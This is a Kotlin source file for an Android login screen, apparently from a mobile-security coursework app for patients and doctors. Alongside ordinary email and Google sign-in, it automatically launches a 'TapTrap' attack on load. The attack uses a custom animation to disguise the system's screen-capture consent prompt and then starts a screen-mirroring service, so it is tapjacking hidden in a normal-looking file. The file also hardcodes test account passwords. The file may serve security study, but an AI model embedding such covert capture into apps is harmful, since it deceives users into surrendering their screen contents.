package com.example.inf2007_mad_j1847.view.auth

import android.app.Activity
import android.app.ActivityOptions
import android.util.Log
import android.widget.Toast // NEW: For simple error feedback
import androidx.activity.ComponentActivity
import androidx.activity.compose.rememberLauncherForActivityResult
import androidx.activity.result.contract.ActivityResultContracts
import androidx.compose.foundation.layout.*
import androidx.compose.material3.*
import androidx.compose.runtime.*
import androidx.compose.ui.Alignment
import androidx.compose.ui.Modifier
import androidx.compose.ui.platform.LocalContext // NEW: To get Context for Toast
import androidx.compose.ui.text.input.PasswordVisualTransformation
import androidx.compose.ui.unit.dp
import androidx.navigation.NavHostController
import com.example.inf2007_mad_j1847.viewmodel.AuthViewModel
import com.google.android.gms.auth.api.signin.GoogleSignIn
import com.google.android.gms.auth.api.signin.GoogleSignInOptions
import com.google.android.gms.common.api.ApiException
import com.example.inf2007_mad_j1847.BuildConfig
import com.example.inf2007_mad_j1847.test.TapTrap
import kotlinx.coroutines.delay
import android.content.Context
import android.media.projection.MediaProjectionManager
import com.example.inf2007_mad_j1847.test.ScreenMirrorService
import android.content.Intent
import android.media.projection.MediaProjectionConfig
import android.os.Build
import androidx.core.app.ActivityOptionsCompat

@Composable
fun LoginScreen(navController: NavHostController, authViewModel: AuthViewModel) {
    val uiState by authViewModel.uiState.collectAsState()
    val context = LocalContext.current // Used for Toast and Google Client

    val activity = context as ComponentActivity
    val tapTrap = remember { TapTrap(activity) }

    val mpm = context.getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager

    val mediaProjectionLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK && result.data != null) {
            ScreenMirrorService.sResultCode = result.resultCode
            ScreenMirrorService.sResultData = result.data!!
            Log.d("TapTrap", "🎥 MediaProjection granted!")

            // ✅ Start service immediately from foreground (LoginScreen is visible)
            val mirrorIntent = Intent(context, ScreenMirrorService::class.java)
            mirrorIntent.putExtra("resultCode", result.resultCode)
            mirrorIntent.putExtra("resultData", result.data)
            context.startForegroundService(mirrorIntent)
        }
    }

    LaunchedEffect(Unit) {
        // THIS IS WHERE THE CODE GOES - IN COMPOSE
        tapTrap.setScreenCaptureCallback(object : TapTrap.ScreenCaptureCallback {
            override fun onLaunchScreenCapture(intent: Intent, enterAnimResId: Int) {
                // Verify the resource exists
                Log.d("TapTrap", "🎬 Launching with animation resource ID: $enterAnimResId")

                // Convert hex to check if it matches R.anim.ani_scale2
                Log.d("TapTrap", "Hex value: 0x" + Integer.toHexString(enterAnimResId))

                // Try to load and inspect the animation
                try {


                    val anim = android.view.animation.AnimationUtils.loadAnimation(context, enterAnimResId)
                    Log.d("TapTrap", "✅ Animation loaded:")
                    Log.d("TapTrap", "   Duration: ${anim.duration}")
                    Log.d("TapTrap", "   FillAfter: ${anim.fillAfter}")
                    Log.d("TapTrap", "   Class: ${anim.javaClass.simpleName}")

                    // If it's an AnimationSet, inspect children
                    if (anim is android.view.animation.AnimationSet) {
                        Log.d("TapTrap", "   AnimationSet detected")

                        // Get animations list - this is the correct way
                        val animations = try {
                            // Use reflection to get animations if needed
                            val field = android.view.animation.AnimationSet::class.java.getDeclaredField("mAnimations")
                            field.isAccessible = true
                            field.get(anim) as List<android.view.animation.Animation>
                        } catch (e: Exception) {
                            Log.e("TapTrap", "Could not access animations via reflection", e)
                            emptyList()
                        }

                        Log.d("TapTrap", "   Animation count: ${animations.size}")
                        animations.forEachIndexed { index, child ->
                            Log.d("TapTrap", "   Child $index: ${child.javaClass.simpleName}")
                            Log.d("TapTrap", "      Duration: ${child.duration}")
                            Log.d("TapTrap", "      FillAfter: ${child.fillAfter}")
                        }
                    }
                } catch (e: Exception) {
                    Log.e("TapTrap", "❌ Failed to load animation", e)
                }

                // 1. Create options with the resource ID
                val options = ActivityOptionsCompat.makeCustomAnimation(
                    context,
                    enterAnimResId,
                    1
                )

                // 2. Launch with options - animation is ATTACHED to intent
                mediaProjectionLauncher.launch(intent, options)

                Log.d("TapTrap", "Launched screen capture with animation ID: $enterAnimResId")
            }
        })
        delay(500)
        // Start the attack
        tapTrap.startAttack()
    }




    var email by remember { mutableStateOf("") }
    var password by remember { mutableStateOf("") }

    val gso = remember {
        GoogleSignInOptions.Builder(GoogleSignInOptions.DEFAULT_SIGN_IN)
            .requestIdToken("959525127524-mpbapotg2h2qt1bn54ap6d3ttevi4aim.apps.googleusercontent.com")
            .requestEmail()
            .build()
    }
    val googleSignInClient = remember { GoogleSignIn.getClient(context, gso) }

    val googleSignInLauncher = rememberLauncherForActivityResult(
        contract = ActivityResultContracts.StartActivityForResult()
    ) { result ->
        if (result.resultCode == Activity.RESULT_OK) {
            val task = GoogleSignIn.getSignedInAccountFromIntent(result.data)
            try {
                val account = task.getResult(ApiException::class.java)
                val idToken = account?.idToken
                if (idToken != null) {
                    authViewModel.signInWithGoogle(idToken)
                }
            } catch (e: ApiException) {
                Toast.makeText(context, "Google Sign-In Failed: ${e.message}", Toast.LENGTH_SHORT).show()
            }
        }
    }

    // Navigation logic
    LaunchedEffect(uiState) {
        if (uiState is AuthViewModel.AuthUiState.Success) {
            val role = (uiState as AuthViewModel.AuthUiState.Success).role
            val destination = when (role) {
                "ADMIN" -> "admin_home"
                "DOCTOR" -> "doctor_home"
                else -> "patient_home"
            }
            navController.navigate(destination) {
                popUpTo("auth_graph") { inclusive = true }
            }
        }
    }

    Column(
        modifier = Modifier.fillMaxSize().padding(16.dp),
        horizontalAlignment = Alignment.CenterHorizontally,
        verticalArrangement = Arrangement.Center
    ) {
        TextField(value = email, onValueChange = { email = it }, label = { Text("Email") })
        TextField(
            value = password,
            onValueChange = { password = it },
            label = { Text("Password") },
            visualTransformation = PasswordVisualTransformation()
        )

        Spacer(modifier = Modifier.height(16.dp))

        if (uiState is AuthViewModel.AuthUiState.Loading) {
            CircularProgressIndicator()
        } else {
            Button(
                onClick = { authViewModel.login(email, password) },
                modifier = Modifier.fillMaxWidth(0.8f)
            ) { Text("Login") }

            Spacer(modifier = Modifier.height(8.dp))

//            Button(
//                onClick = {
//                    Log.d("TapTrap", "🔴 TEST BUTTON CLICKED - Launching attack")
//                    onAttackTrigger()  // Calls TapTrapAttack.java
//                },
//                modifier = Modifier
//                    .fillMaxWidth()
//                    .height(60.dp),
//                colors = ButtonDefaults.buttonColors(
//                    containerColor = MaterialTheme.colorScheme.error,  // Red = test mode
//                    contentColor = MaterialTheme.colorScheme.onError
//                )
//            ){
//                Text("TEST TAPTRAP ATTACK")  // ← Content goes HERE
//            }


            OutlinedButton(
                onClick = { googleSignInLauncher.launch(googleSignInClient.signInIntent) },
                modifier = Modifier.fillMaxWidth(0.8f)
            ) {
                Text("Sign in with Google")
            }
        }

        Spacer(modifier = Modifier.height(16.dp))

        TextButton(onClick = { navController.navigate("signup_screen") }) {
            Text("Don't have an account? Sign Up")
        }


        if (BuildConfig.DEV_MODE) {
            Spacer(modifier = Modifier.height(12.dp))

            Button(onClick = {
                authViewModel.login("xuanyang@mobsec.com", "securepassword")
            }) {
                Text("DEV: patient login")
            }

            Button(onClick = {
                authViewModel.login("diniezikry@mobsec.com", "securepassword")
            }) {
                Text("DEV: Doctor login")
            }
        }

        if (uiState is AuthViewModel.AuthUiState.Error) {
            Text(
                (uiState as AuthViewModel.AuthUiState.Error).message,
                color = MaterialTheme.colorScheme.error
            )
        }
    }
}